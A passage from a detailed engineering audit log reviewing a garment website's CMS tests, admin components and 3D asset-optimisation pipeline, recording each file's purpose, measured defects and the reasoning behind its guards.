- `lib/inquiry.test.ts` — Accepts complete inquiry; ⚠️ company optional ON PURPOSE: "refusing them an inquiry over it would turn the form into a filter against exactly the small first orders the 50-piece minimum exists to invite"; all errors collected at once ("A form that reveals its problems one refresh at a time is how people give up"); ⚠️ "THE PERMISSIVE CASES ARE THE POINT OF THIS BLOCK, NOT THE REJECTIONS" — plus-tags, long TLDs, IDN domains all accepted: "the cost of a false rejection is a buyer who cannot make an inquiry, which is the outcome the whole site exists to avoid. Whether an address receives mail is settled by replying to it." Also honeypot + subject/email formatting.
- `lib/contentCache.test.ts` — "The caching CONTRACT, exercised against a stand-in for Payload": content.ts imports `@payload-config` "which pulls the whole CMS config and a Cloudflare binding resolver into the test process — so the behaviour is pinned here against the same shape instead. What matters is the policy." Three rules each easy to get wrong unnoticed: "a hit must not call the database / an expired entry must / a FAILURE must never be cached, or one bad second becomes one bad minute" — the last with the sharper consequence: "it would keep serving defaults after the database recovered."
- `lib/posterHost.test.ts` — "The preconnect rule, extracted as data rather than mocked through a React render": the function lives beside its page; "this pins the DECISION, which is the part that can go wrong silently: preconnecting to an origin the page does not use costs a connection and buys nothing, and preconnecting to the current origin is pure waste." Covers: cross-origin media host named, same-origin silent, relative URLs silent ("PUBLIC_MEDIA_BASE_URL is unset outside production… Emitting a preconnect then would advertise nothing"), placeholder cards skipped, malformed URL degrades to "no hint" not a 500. NOTE: the source function lives in the page component — `lib/posterHost.ts` does not exist; this test holds a local copy of the decision.

- `lib/cursorBus.test.ts` (26 lines, read whole) — Two assertions only: every publish reaches every subscriber (unsubscribe stops delivery), and ⚠️ a late subscriber gets the last point replayed — "so a footer mounting mid-move is lit at once."
- `lib/cursorMath.test.ts` — Frame-rate correction "ASSERTED AS THE THING IT IS FOR: two displays running for the same WALL-CLOCK time must land the ring in the same place." ⚠️ The negative control is deliberate: pinning `dt` to one frame "is what the old code did" and these expectations reject it (FA-H-03); "the uncorrected behaviour it replaces would NOT agree." Reduces to k exactly at one 60Hz frame; 60Hz vs 120Hz over the same 100ms lands equal.
- `lib/families.test.ts` — ⚠️ "THE FAILURE THIS GUARDS IS SILENT, WHICH IS WHY IT READS THE COLLECTION AS TEXT": the gallery filter matches `product.category` against `FAMILIES[].name` by string equality — rename an option in Products.ts and "nothing throws, nothing fails a typecheck… the chip is still there, still clickable, and returns an empty gallery for ever — the same shape as the `aria-current` rule this project shipped, correct CSS that had never once applied." Reads source rather than importing because Products.ts pulls Payload config "which need a database and an environment; claudeMd.test.ts and workflowHardening.test.ts take the same approach for the same reason." Parse is narrow and fails loudly if the file's shape changed.
- `lib/seo.test.ts` — ⚠️ Origins are DIFFERENT hosts: "The viewer is reached from printed QR tags and is a separate Worker. If the marketing pages ever claimed canonical URLs on that host, Google would be told the garment page and the marketing page are the same document." No trailing slash on either origin "so joins never double up"; homepage canonical is the bare origin not `/` — "two spellings of one site, which is what canonical exists to prevent"; OpenGraph/Twitter carry the SAME title/description/URL as the page — "The viewer learned this one: tags that exist on some pages and not others produce link previews that are right sometimes and generic otherwise, and nothing fails."
- `lib/llmsTxt.test.ts` — "The drift gate for /llms.txt (FA-N-16)": "The whole risk is quiet disagreement: a number changes on the home page, nobody remembers there is a second audience reading a second copy, and the site tells a buyer one thing and a language model another. Nothing about that state looks wrong, and an AI answer engine is precisely the reader least likely to be checked by hand." ⚠️ Every assertion generated from the same constants the pages render — "there is no literal `100,000` in this file either." Cert paragraph names DURUS INDUSTRIES "because an llms.txt is quoted back verbatim more often than a page is, so dropping the holder here would be worse than dropping it on the page." Also imports `llmsTxtProblems` from scripts/copy-rules.mjs (link-rot checks run against the file too).
- `lib/inquiryRate.test.ts` — Per-address limit allows a plausible number then stops; ⚠️ "THE ASYMMETRY THIS GUARDS" restated as a test: "If someone ever 'tightens' this to 1 or 2, an office behind one address loses its second inquirer of the day and nobody finds out" — so a floor assertion (MAX_PER_IP ≥ 3, window ≤ 15 min) exists. Addresses counted separately; window forgets; negative control: one millisecond short is still blocked. Isolate-wide backstop + MAX_TRACKED_IPS cap covered with `__resetInquiryRate` seam.
- `lib/reportCaught.test.ts` — ⚠️ "MEASURED IN SENTRY, 2026-09-07": the cms project holds exactly two events, both deliberate L6-03 probes from 2026-09-01 — so DSN/envelope/stack parsing are proven end to end "and no error the RUNNING CMS caught has ever reached it, because until 2026-09-07 nothing called this function." The last half "cannot be closed from here: the DSN is a Cloudflare Worker secret… the only proof available before a deploy is that the wiring is correct and cannot fail quietly." ⚠️ "THE PROPERTY THAT MATTERS MOST IS THE ONE THAT IS EASIEST TO OMIT": it runs on a render path inside a catch "whose whole purpose is to keep a page alive — if it can throw, a database wobble stops degrading gracefully and starts taking the page down, and it would do so only when the database is ALREADY unhealthy, the worst possible time to discover it." Mocks `@opennextjs/cloudflare` to throw so `resolveDsn` exercises the process-env path.
- `lib/projectPublic.test.ts` — mergeSiteSettings contract: shared defaults when global never saved (toMatchObject "not toEqual: the return type EXTENDS ViewerSiteSettings with the tab-icon fields, which the shared defaults deliberately do not carry"); ⚠️ "IGNORES a bare row id, which is what a depth-0 read returns" — "If that ever drops back to 0 the upload arrives as a number, and rendering it would emit `<link rel="icon" href="7">` — a broken icon on every page, with nothing failing" (why getSiteSettings reads depth 1); falls back when the media row has no URL; prefers saved over defaults; footer/project card projection covered.
- `lib/structuredData.test.ts` — Stable `@id`: "Without it each page declares an unrelated company and a crawler has no reason to treat them as one entity" (contactPageJsonLd.mainEntity must point at organizationJsonLd's @id); logo precedence "Same precedence as the browser tab icon, so the two cannot disagree about which mark represents the company"; address formatting, ItemList and Website blocks exercised with explicit settings/card fixtures.
- `lib/privateDocumentLinks.test.ts` — ⚠️ Header states the threat model: the three "Catalogue link" fields are PUBLIC ("the product API emits catalogueUrl twice, measured 2026-09-11") and "the most likely way a private document link leaks is not an attacker — it is someone pasting the new link into the field whose label says 'Catalogue link'. These tests keep that from saving." Host list pinned against `infra/apex-404/documents.js` — "Named, not only derived: a wear-run.com link in a public field would be published" too; finds named fields anywhere in the Payload tree (tabs/groups included) and asserts each field's validate rejects the private URL.
- `lib/footerCopy.test.ts` (18 lines, read whole) — splitLastWord: last word separated from trailing punctuation; single word and absent-punctuation edge; trailing whitespace treated as absent.

## 16i. apps/cms — final batch: 9 lib tests + 6 .tsx components (ALL READ 2026-09-22)

- `lib/readingLevel.test.ts` — FA-I-11: "the instrument, proved BOTH WAYS before it is pointed at the site" (the rendered half is `apps/cms/e2e/legibility.spec.ts`). Its whole job is to show the number MOVES — "a ceiling on a score that cannot rise is the same class of gate as the three GPU harnesses this repo shipped that reported clean while measuring nothing." Negative control: deliberately dense prose must land grade > 20, ease < 20, and ≥15 grades above plain — "not 'greater than plain' — a real separation, in the direction the ceiling is set". Honesty test pins three syllable counts that are WRONG (area→2, idea→2, being→1, measured against the implementation 2026-09-07): recorded rather than patched because "a special case per word is how a proxy quietly becomes a lookup table" — if one starts coming out right the test fails, which is the point: the heuristic changed and every ceiling moved with it. Sentence counting survives decimals and abbreviations ("1.5 million" → 2 sentences); unscorable input (chip labels, whitespace) returns null — "Returning 0 would read as 'perfectly plain' and pass every ceiling"; one long sentence scores worse than the same words split.
- `lib/robotsTxt.test.ts` — FA-N-17 plus the owner's reuse policy of 2026-09-07. Parsed into groups on blank lines the way a crawler would (an earlier version split on every `User-agent:` line and failed against a file that was correct). ⚠️ The per-group assertions are the ones "a reasonable person would leave out" and the ones that matter: RFC 9309 — a named group REPLACES the `*` group, so a tidy `GPTBot + Allow: /` edit would hand every AI crawler /admin and /api and drop the ai-train=no signal "while making the file read more welcoming than before". Allowed groups each carry every DISALLOW; the training-only group refuses everything with NO Allow line at all (an `Allow: /` ties `Disallow: /` exactly and quietly re-opens the crawl "while the file still reads as a refusal"); no crawler appears in two groups; Content-Signal is repeated in all three groups — "the failure is invisible: the file still parses … and simply stops expressing the owner's objection to the only agents that objection is about." Policy asserted: ai-train=no, search=yes, ai-input=yes, names contentsignals.org, and "does not claim to be a block". ⚠️ "THE ASSERTION THAT PROTECTS THE BUSINESS": the eight answering bots (OAI-SearchBot … Amzn-User) are WELCOME — moving any into the refused group "would look like tightening security rather than losing leads"; training-only is exactly the eight the owner named (2026-09-11, last three joined 2026-09-16); the welcomed list equals AI_CRAWLER_UAS minus the refused, "a crawler we invite is a crawler we owe a finished `<head>`." Sitemaps: both hosts in order with origins from lib/seo.ts (nothing hardcoded); plain text, no markup, trailing newline.
- `lib/posterLoading.test.ts` — IM-05/PF-20: card 0 eager at high priority, the rest of the first row (EAGER_POSTERS) eager without competing for priority, every later card lazy across 80 cards; "asks for high priority exactly once in a whole gallery".
- `lib/searchVisibility.test.ts` — The switch that keeps the beta out of search engines (owner decision 2026-09-06: a deploy-time setting, not an admin field, hidden until the owner calls it final). ⚠️ FAILS CLOSED: undefined, null, '', 'HIDDEN', 'Visible', 'visible ', 'true' and 1 all resolve hidden — "every branch here is a way the site could become indexable by accident"; only the exact word 'visible' opens it. Resolution order proved with `vi.hoisted` (a plain const would be in the temporal dead zone when the hoisted vi.mock factory runs): Worker binding beats the process env, a rejected context falls back to process (next start, tests), nothing set stays hidden. Effect: hidden → `{ index: false }` robots — `undefined`, not `{ index: true }`, because declaring index in the layout broke the 404's own noindex after hydration (measured 2026-09-05) — and an empty sitemap; visible → the layout declares nothing and the sitemap lists the pages on the given origin.
- `lib/documentVisitsSummaryData.test.ts` — Proves exactly two `payload.find` calls reach `summariseVisits` with the right rows and arguments (the arithmetic is proven in summariseVisits' own file): document-visits with the exact where (`day >= '2026-08-17'`), pagination false, depth 0; document-visit-emails with sort `-week`, limit 1, depth 0. Last-7 is sliced from the 30-day result without a second query; the 7-day boundary is pinned to the day (2026-09-09 in, 2026-09-08 out; fixture NOW is 2026-09-15 in Asia/Karachi too); the newest email row maps to lastEmail; an empty result gives zeros, null and today's date; a null country/city survives the round trip as '' so null can never appear in topCountries.
- `lib/themeColor.test.ts` — CO-05: exactly one colour per scheme; THEME_COLOR must equal the two halves of `--bg: light-dark(…)` parsed from `packages/ui/src/tokens.css`, "the source of truth" (the parser throws if --bg is no longer a light-dark pair). ⚠️ Negative control: plant a changed token and require the drift checker to report both schemes — a drift check that cannot fail has proven nothing, so the plant itself is guarded ("the plant did not change tokens.css").
- `lib/pageDescriptions.test.ts` — L-06/FI-01: search results show the first ~160 characters; measured live 2026-09-16 the home page ran 296 and products 186, ends cut off "in front of every searcher". The ceiling is asserted to BE 160 — the length search results use, not an arbitrary round number. Every description (home, products, every family-filtered variant) sits in 50–160 and passes the copy rules (British spellings, buzzwords, emoji, placeholders, em dash); the owner's 2026-09-16 wording is pinned verbatim; the home description must name all six categories "as the owner asked"; a filtered view prefixes the family and keeps the rest.
- `lib/footerHours.test.ts` — The works time zone named once (Asia/Karachi); formatHours renders as the footer prints ("Mon–Sat 09:00–18:00 PKT", single-day week too); isOpenAt evaluated in Sialkot time — close is EXCLUSIVE (17:59 open, 18:00 shut), before-open shut, Sunday shut for a Mon–Sat week, a week that wraps past Sunday (Sat–Mon) and hours crossing midnight all covered; worksClock renders HH:MM and "never 24:00" (h23 → 00:00).
- `lib/wordmarkFit.test.ts` — fitScale spans the available width with a hairline of safety (×0.995: 1000/500 → ≈1.99); a missing or NaN measurement on either side returns 1, "so a bad read never blanks the name".

### The 6 .tsx components — the only non-.ts files in these directories

- `collections/DocumentVisitsSummary.tsx` — The summary block above the Document-visits list table (`beforeListTable`), a Server Component with no client JavaScript: `payload` arrives as a direct prop, confirmed against this installed Payload version's own bundled types rather than assumed from Dashboard.tsx's case. Renders last-7 and last-30 blocks per document from `loadVisitSummaries`, the device split, top countries with city counts, and the weekly-email outcome in the operator's words ("No weekly email yet" / "sent <week>" / "not sent — <error>").
- `collections/RawUploadStatusCell.tsx` — `'use client'` status cell that polls `/api/raw-uploads/<id>?depth=0` every 5s ONLY while queued or processing and stops for good on a terminal status ("an idle list makes no requests at all"); cancelled-flag cleanup, dropped polls swallowed ("the next one is 5s away"), `aria-live="polite"` plus an hourglass while spinning. Why it exists: FIRST-GARMENT-UPLOAD.md step 3 used to tell the owner to "watch the Status column, refreshing every minute or so" — the manual was written around a stale screen, and a 1–2 minute job read as a system that had hung. Reads LABELS from `rawUploadStatusLabels.ts`, the module that must never carry 'use client' (see its own note).
- `fields/SourceVariantSelect.tsx` — "Which colour in your CLO file is this?" The fix for the flow's single most common failure: hand-matching `N001-NAVY` names character for character, a mismatch surfacing only as dead colour buttons after a ~350 MB re-upload. Now CLO names whatever it likes, the robot reports the names it found in file order, and this dropdown stores the chosen string verbatim as `variantId`. ⚠️ The 2026-08-03 incident is why the swatch exists: a maroon garment labelled Navy, a blush one labelled Black, every published name wrong with two colourways never mapped at all — options now say what the robot MEASURED ("looks like <name> (<hex>)" on high confidence, "closest match …, not confident" on low), and the selected swatch is announced via `role="note"` and aria-label rather than left as decoration: "trust the swatch." Suggestion only — nothing here writes a name, a slug or a row. Enrichment, not replacement: `fileColourDetails` is guarded so a product processed before variant colours existed keeps working; a stored value no longer in the file stays listed as "not in the current file" rather than silently blanked. ⚠️ ALL HOOKS MUST STAY ABOVE THE EARLY RETURN — the component returns early for unprocessed products, and a hook added below it is a runtime crash, not a type error. Empty state is a disabled input pointing at the 3D file tab.
- `fields/ReadinessPanel.tsx` — "What is still stopping this from going live?" The publish rules, once reachable only by pressing publish and being refused (one problem per attempt until 2026-08-10), now run continuously against the form by REUSING `collectPublishProblems` — a second copy of the rules that drifted "would be worse than no panel: it would say 'ready' and then be refused." Always evaluated as though the owner were publishing, whatever Status says. States its blind spot aloud: the artwork verdict lives on the Media document, so "the printed artwork is checked separately when you save." ⚠️ The colours come from `rowsFromFormState`, NOT `f.colourways.value`: Payload flattens an array field so the obvious read is silently undefined — which made this panel report "This product has no colours yet" on a live product with three complete colours while every test, the typecheck and the build stayed green (measured in the running admin 2026-08-11; probe output in ./formStateRows.ts).
- `fields/ColourRowLabel.tsx` — Row label "01 · Navy" instead of Payload's "Colour 01", so five collapsed rows are distinguishable, marking retired rows "— hidden from the website". `active` defaults true (only an explicit false is hidden) — the same default colourwayAccess relies on.
- `fields/ImportColoursFromFile.tsx` — "We found colours in your file that are not on your website yet": N001's uploaded file held five colourways, three mapped, two invisible to every buyer with nothing in the admin hinting they existed. All rules live in `packages/shared/src/importColours.ts` (moved there 2026-08-10 so apps/shrink can reuse them): never rewrites an existing slug (printed on QR tags), never reorders rows (the first switched-on row is the default colourway), never switches anything on — this file is the shell: a tick-list with measured swatches, append-only and re-reading the growing list each push so two imported rows cannot claim the same slug; added rows are switched off, so "nothing has changed for buyers yet"; a low-confidence match shows "Colour needs a name" rather than suggesting one — "Suggesting one confidently is exactly how a maroon garment came to be called Navy."

### Item 16 sweep summary — COMPLETE 2026-09-22

106 files in scope (100 `.ts` + 6 `.tsx`) across collections (27), endpoints (15), fields (9), lib (49); Products.ts, RawUploads.ts and publicViewer.ts were read as items 1–3, and `lib/posterHost.ts` does not exist (only `posterHost.test.ts`, which holds a local copy of the decision). Cross-cutting findings: (1) access control is the recurring audit theme — Media read was public until 2026-09-05 and what leaked was the INDEX (measured: unauthenticated GET returned all 68 documents), Inquiries starts closed as the most sensitive data stored, the three visit collections are hard-closed for everyone, and GHSA-jg8r-5jh2-v2xj has first_patched_version NONE, neutralised by `unlock: isAdmin` in configuration; (2) the dominant defect shape is drift between two copies of one rule (ALLOWED_MIME_TYPES built from the picker lists, families vs Products.category, ReadinessPanel vs the gate, robots per-group repetition, mediaReferences vs find-orphan-media) — each is held by a test that compares the copies rather than restating the value; (3) these tests routinely prove their own ability to fail — negative controls in readingLevel, themeColor, robotsTxt and searchVisibility plant the defect first; (4) most guards were written after a measured live failure (2026-08-03 wrong colour names, 2026-08-11 undefined colourways, 2026-08-21 detached posters 404ing a published garment, 2026-09-05 media enumeration) — the date and the measurement live in the file beside the fix.

## 17. tools/asset-pipeline/src/ (74 files) — COMPLETE (36 sources + 36 tests + 2 .d.ts, ALL READ 2026-09-22)

- `alpha-coverage.ts` — Keeps a graphic's ink when BLEND→MASK at `alphaCutoff 0.5` discards edge pixels. Measured 2026-08-27: X-MILO 0.67–2.04%, METRO-SHIELD 1.32–3.11%, MATRIX-PUFF 0.56% of whole-texture pixels lost — slogan maps are ~13% ink so losing 1.11% of all pixels ≈ 8% of the ink, all at stroke edges; thin strokes disappear entirely; owner reported "missing bits and pieces" and it was invisible to every gate because `findArtworkAlphaProblems` treats MASK at exactly 0.5 as correct. Fix is Castaño's published alpha-test coverage preservation (bisect the bounded [0,1] reference coverage, rescale the alpha channel) — rescale the texture rather than lower the cutoff because the checker flags non-0.5 cutoffs.
- `artwork-geometry.ts` — Finds printed artwork by the SHAPE of its UV mapping, not its name. Measured: `ARTWORK_MATERIAL_NAME` matches nine English words, yet 8 of 28 raw exports have not one matching material (AERO-TECH WINDBREAKER … ZENMOVE TIGHTS) so their graphics took the fabric compression budget; ~300 materials carry names no English list can match (`ZZ00000ZZZZ0`, `76197`, `01`, `ルン ろご。`). Census of span p05/median/p95 per name group: fabric panels ~69.91/294.81/938.50 vs topstitch 0.83/0.83/1.35 — decal = small own rectangle, panel = large atlas. Exports `uvSpanInPatternSpace` and `isThreadOrHardwareName` used across the package.
- `attribute-bytes.ts` — What a garment is made of: bytes per vertex attribute + texture VRAM once unpacked. Header: ⚠️ nothing in the project measured either, which is why both went unnoticed for weeks. TEXCOORD_0 is 46.8% of n001's and 51.6% of v001's geometry left as 32-bit floats (CLO writes UVs outside 0..1 — measured −627.94..+800.86 — and the quantizer correctly refuses, printing `Skipping TEXCOORD_0` where nobody reads it). A 40 MB download ceiling asked to serve as a memory limit: measured 0.4 MB texture data → 38.1 MB graphics memory (100.7× expansion) — a garment can pass every size gate and still crash an older phone. ⚠️ Self-check `plausible` is not decoration: the first version reported 208 MB of indices inside a 16.56 MB file by summing per accessor where many share one bufferView — physically impossible, and that is the only reason it was caught.
- `cli.ts` (1,038 lines) — The `pnpm pipeline` entry: USAGE documents `merge --from-cms <product-slug>` (variant names come from the CMS, so nothing has to be named inside CLO 3D) plus optimize/render/compare/describe/posters/placeholders/validate subcommands; imports ~20 pipeline modules including `overlay-depth`, `ink-contrast`, `texture-fold`'s phone GPU budget, `raw-census`.
- `colour-name.ts` — Names colours from the file itself. WHY: hand-typed names mapped by hand to CLO variant labels = two independent chances to be wrong with no feedback loop; 2026-08-03 live site served maroon labelled "Navy", blush "Black", powder blue "Crimson", two colourways unmapped — every check passed. Lives here (not `@run-apparel/shared`) because the shrink container installs with plain `npm install`, where `workspace:*` does not resolve — same constraint as `SIZE_WARNING_BYTES` in validate.ts. CIEDE2000 `deltaE`; `confidence: 'high' | 'low'` where low means "show the swatch and ask" — guessing loudly is how a maroon garment came to be called Navy; ΔE00 >10 = plainly a different colour = a guess.
- `compare.ts` — Contact sheets: two renders side by side with the difference amplified (`DIFF_THRESHOLD` 8/255, `DEFAULT_DIFF_GAIN` 6). Amplify because the artwork failure is subtle per pixel and obvious in aggregate — a raw diff of two 98% identical renders is almost black; label numbers are the unamplified truth, the picture only points. Flatten both sides onto mid-grey (128) first or model-viewer's transparent background lights up entirely when the silhouette moves one pixel.
- `describe.ts` — Reads a raw export's SHAPE without processing it: measured 2026-08-26 across all 28 raws, 15 are texture-heavy and 12 geometry-heavy, so `shrink.ts`'s whole justification is true of only one family. ⚠️ JSON chunk only, never the binary payload (a 1,253 MB export parses in the same time; do NOT "simplify" to `readFile` the way `readGlbGenerator` does — that pulls 1.3 GB into a Buffer against a ~4.09 GB V8 heap). ⚠️ Not gltf-transform: its reader normalises on import (fills absent `metallicFactor`, overwrites `asset.generator`) — exactly the raw-CLO shapes this must see. `TEXTURE_FAMILY_MIN_FRACTION` 0.6 / `GEOMETRY_FAMILY_MAX_FRACTION` 0.4.
- `gltf-spec.ts` — Khronos's own validator, and the header warns against expecting too much: measured 2026-08-27 on ARISAN SPORTS BRA the `setMagFilter` null crash yields **0 errors, 0 warnings** because `texture.source` is OPTIONAL in glTF (an extension may supply the image) — `repair-dead-textures.ts` names that defect in about a second with no dependency; "Do not re-add this expecting it to catch that." Real job: police OUR output (quantise, re-encode textures, rewrite alphaMode across thousands of materials, patch raw JSON bytes) — all 28 raws are spec-valid, nothing checked what the pipeline writes. ⚠️ Must be a PRODUCTION dependency: first attempt had it as dev; the container installs `npm ci --omit=dev`, so it resolved locally and was MISSING inside the container — passing every local gate, surfacing as a failed shrink job.
- `ink-contrast.ts` — Does printed ink come out the colour of the cloth it sits on? glTF renders texture × factor; these artwork textures are near-white stencils so the FACTOR is the ink colour — and CLO writes the colourway's FABRIC colour into the print's factor on 13 of 16 garments. Measured: live skinsuit chest slogan 1.22–1.38:1 against its cloth on three of five colourways (blank fabric 1.05–1.20) vs 3.10 and 6.12 on the two that work. REPORT, NEVER GUESS: two automatic fixes were tried and both painted the wrong prints white (docs/SESSION-2026-08-28.md) — a white stencil × dark factor is exactly how a COLOURED print is authored; Minecut's slogan sits on a white band but "matches" the grey skirt. So each print is measured against the cloth immediately BEHIND it (the support primitive from `overlay-depth.ts` only the pipeline can see), owner rules per print; dominant fabric is the stated fallback when nothing sits behind. WCAG luminance ratio; below `INVISIBLE_CONTRAST` the print reads as blank cloth, below `WEAK_CONTRAST` it is faint.
- `io.ts` — Shared lazy `NodeIO` singleton: all Khronos extensions + Draco and Meshopt codecs registered once, so raw CLO exports read reliably whatever they contain. ⚠️ SIX OF 28 RAW EXPORTS CANNOT BE READ AT ALL without the dead-texture repair — `Cannot read properties of null (reading 'setMagFilter')`, in 17 ms, before any transform runs: 21% of the catalogue failing with an error that names nothing useful and reads as a pipeline bug rather than a corrupt export. `ReadGlbResult.repair` records what had to be repaired (empty for a healthy export).
- `material-class.ts` — Three buckets (`hardware`/`fabric`/`unclassified`) for the metalness fix. WHY material names not texture names: measured 2026-08-26, **0 of 5,048 images carry a name or URI** while every material is named — a texture-name classifier is silently inert on a real CLO file (has already cost two attempts). WHY a third word list: merging has been tried and reverted (`ARTWORK_NAME` includes `text`/`type` → `Textile_Cotton` would exempt real fabric from the fix; `TRIM_NAME` answers a different question). Third bucket is a real output: owner decision 2026-08-26 — the 20 `Trim_*` materials at metallic 1.0/roughness 0.1 are REPORTED every run, never rewritten; "Do not 'tidy' this by adding `trim` to HARDWARE or FABRIC without a rendered crop." Measured: 6,666 materials, **515 metallic with no metallicRoughnessTexture**; hardware takes 440, remaining 75 split 55 fabric / 20 unclassified — closes 515 exactly. ⚠️ The design document said 35 fabric and its own arithmetic gave it away (515−440=75 but 35+20=55): 35 counted distinct NAMES, Training Trouser carries 20 distinct names across 40 materials — corrected in-file 2026-08-26. `\b` NOT usable (`_` is a word character, `\bslider` would miss `Zipper_Slider`, the single most important real name). ⚠️ CamelCase split: without it the whole classifier is HALF-BLIND AND IT WAS — `TapeFabric` puts `fabric` after a letter so `Zipper 1_TapeFabric_3583` classified as pure hardware and the zipper's woven tape would have been pinned at metallic 1.0 by the very function written to stop that; "the third time a name-based check in this pipeline looked correct and done nothing on real CLO data … run it against real names." ⚠️ A name carrying both is AMBIGUOUS and REPORTED, not resolved by ordering: an earlier draft said "hardware wins ties" — wrong, because `Zipper 1_TapeFabric` is the woven TAPE (fabric) and hardware-wins would reintroduce the exact defect; the other order forces `Zipper_Slider` flat. No ordering is right for both → caught by writing the test before the implementation.
- `merge-variants.ts` — Merges one raw GLB per colourway into a single production GLB whose colourways are `KHR_materials_variants` named after CMS variantIds; the first input provides geometry, every input contributes one variant's materials. `parseMergeArgs` is pure and exported (kept out of `cli.ts`, which auto-runs on import); splits `<file>=<VARIANT-ID>` on the LAST `=` so paths may contain `=`; `--from-cms` is resolved BEFORE the main loop so flag order never changes what the command means. ⚠️ The "must stay in step with parseOptimizeArgs" comment made exactly that claim until 2026-08-29 while SIX flags were missing — an unrecognised token falls through to the positional branch and is reported as a malformed `<file>=<VARIANT-ID>`, naming the wrong thing entirely; three of the six are in `shrinkFlagsFor('fidelity')`, so the flag list every production shrink job uses could not be passed to `merge`. Pinned by a per-flag table in pipeline.test.ts with `parseOptimizeArgs` as its positive control. Uses `finiteNumber`, not `Number()`: 390ff27 fixed exactly this in `parseOptimizeArgs` and left merge behind — `--quality garbage` became NaN used as a real value; the old `?? DEFAULT` spelling looked like a guard and only caught a MISSING token, never a malformed one. `assertSameTopology` fingerprints every primitive (count/mode/vertices/indices) and its error points at `variantMode "separate-glb-per-colour"` as the supported alternative. A primitive with no material → warn + skip its mapping (a mapping with a null material is spec-invalid; default material applies). Rejects <2 inputs and duplicate variant names.
- `optimize.ts` (1,002 lines) — The shared optimisation chain both `merge` and `optimize` build from, so compression policy lives in one tested place. Artwork defaults 95 quality / 4096 px: textures are ~2 MB of a ~19 MB garment and geometry is the rest, so buying fidelity there is close to free — the old trade (everything at 82, capped 2048) "saved almost nothing and cost the one thing on the model a customer is looking at". `DEFAULT_SIMPLIFY_ERROR` 0.0001 is glTF-Transform's own default; we previously hard-coded 0.001 = 10× looser, which visibly tore printed logos apart — kept as the floor even though UV error is now inside the budget (complementary protections; loosen deliberately via `--simplify-error`). `DEFAULT_STITCH_ERROR` 0.0005 measured 2026-08-21 on the Cycling-Bib by rendering 4° macro crops (the only view that can see the damage — at the default 18° a ruined cord looks identical): 0.0005 asked to keep 3% of thread and kept 3.99%, stopping early rather than damaging the cord — self-limiting is the point; a 20× looser 0.01 produced the frayed spiky output rejected on sight. UV weight 1 (meshoptimizer's guidance for normalized attributes), normal weight 0.5 ("shading matters, artwork matters more"). ⚠️ The `| undefined` on the four simplify options is REQUIRED: `?: number` means "key may be absent" but does NOT permit explicit `undefined`, and both callers build the object from parsed CLI args and pass the key unconditionally — writing `?: number` "was a claim the code did not honour, which is exactly the absent-vs-present-and-empty confusion that already bites this interface once: the `opaque` default mismatch … where the two call paths disagree about what an absent key means and decals shipped see-through." `solidifyMaterials`: CLO frequently marks opaque fabric as BLEND and model-viewer (three.js, no OIT) draws it see-through; blanket-forcing OPAQUE was wrong because BLEND covers two situations — stray fabric opacity → OPAQUE, a real decal cutout → MASK/0.5 (flattening fills the cutout back in = "artwork half there"); `--keep-transparency` looks like the fix and is not (no OIT → depth-sorting artefacts, trading one half-visible for another). The decision moved to `resolveBlendAlpha` in textures.ts (2026-09-02) so the gate that polices this step shares the exact rule. Double-siding exemption used to be `!== 'MASK'` alone and SHIPPED A VISIBLE BUG (found 2026-08-21 by the owner): the Cycling-Bib care label authored on the INSIDE, single-sided, was forced double-sided and rendered its back face through the fabric — mirrored, text reversed, on the outside; the condition was too narrow (the label stays BLEND), so it now judges what the texture IS. Name-only classification on purpose — widening `isArtworkTexture` would widen the blocking `findArtworkAlphaProblems` gate, "widening a blocking gate to fix a rendering bug would be a bad trade"; BOTH name signals because a CLO export names the MATERIAL and leaves textures anonymous (0 of 24 textures named on the measured file — texture-only check was completely inert). ⚠️ "EVERY NON-DECIMATION PASS ADDED HERE MUST ALSO BE ADDED TO THE BASELINE IN `tools/asset-pipeline/scripts/eval-artwork-legibility.mjs`, OR THAT GATE GOES RED FOR THE WRONG REASON": `normalizePbr` broke the eval's own promise the day it was added (runs on the optimized side only) — fidelity 1.650→15.290, balanced 3.070→16.070, CONTROL 9.370→18.760 against a 5.000% ceiling; rendered and looked at, letterforms were intact and merely lighter. "It cost a branch. All three rows moving TOGETHER, control included, is the signature of a constant offset rather than damage — check for that first." Chain order is load-bearing: census FIRST before dedup (dedup is there to count duplicates); dedup; prune; `alignVariantTexCoords` immediately after prune (prune renumbers UV sets and updates only each primitive's DEFAULT material, leaving colourway-only materials pointing at an attribute that no longer exists); normalizePbr before solidify (metalness edit nothing downstream reads; the two decisions independent); solidify; fold BEFORE encoding (a 2048² roughness map holding eight values costs 21 MB of phone memory for two numbers a factor expresses — folded first, never encoded/deduped/counted); WebP via `compressTexturesForArtwork` not glTF-Transform's `textureCompress` (which cannot reach `smartSubsample`, the setting that addresses 4:2:0 chroma bleed on artwork); KTX2 as three slot-scoped passes with the colour space said EXPLICITLY since 2026-09-03 — the encoder writes the transfer function from `isSetKTX2SRGBTransferFunc` and until now no pass set it, so colour and data maps were stamped alike ("That, not ETC1S vs UASTC, was the variable in the 2026-08-21 refusal"); decimate (weld first; lockBorder was the wrong tool — protected logos but produced 58.3 MB over the 40 MB ceiling; measured textures were 2.1 MB of a 373 MB export = the mesh is what makes it huge); ⚠️ dedup+prune AGAIN after re-encoding (TEX-05: the first dedup runs on the raw export where a byte of metadata differs; after re-encode they are byte-identical — the live skinsuit shipped a 640×640 twin, the bib a 2048×1863 normal map, that only a second pass sees); `stripRootExtras` AFTER the final prune and NOT by changing `keepExtras` (keepExtras governs properties carrying extras; treeShake never runs on Root; setting it false would start disposing material-level `extras.depthBias` that overlay-annotate writes and the viewer reads through three.js `userData` — returning the decal z-fighting with no error anywhere); stitch pass BEFORE the general decimator and, on a stitch-shaped garment, INSTEAD of it (`Cloth_mesh` at 11,128 triangles needs no decimation — doing both is what frayed the cord; when the stitch pass runs it OWNS those meshes and `skipMeshes: DEFAULT_STITCH_PATTERN` is handed to the general simplifier, so thread takes the stitch budget and the garment takes the other — the comment said the opposite until 2026-08-26, describing pre-guard code, and "the advice was unfollowable: every production run returns BOTH flags for both detail levels"); uvRemap LAST before the codec (quantizer refuses UVs outside 0..1, CLO writes pattern space, so every UV set shipped 32-bit; 16 bits because the widest fabric group quantizes to 0.19 px at 16 vs 3.1 px at 12); geometry codec; `estimateGpuTextures` LAST so it counts what ships. ⚠️ `OptimizeResult.rootExtras` was MISSING until 2026-09-05 — declared on telemetry, assigned in optimizeDocument, never spread at the public boundary, so the strip ran and its result was dropped: unreportable, unassertable — "Same defect as the Khronos verdict the 2026-08-28 pipeline audit found being computed and discarded. A telemetry field that is not on this type does not 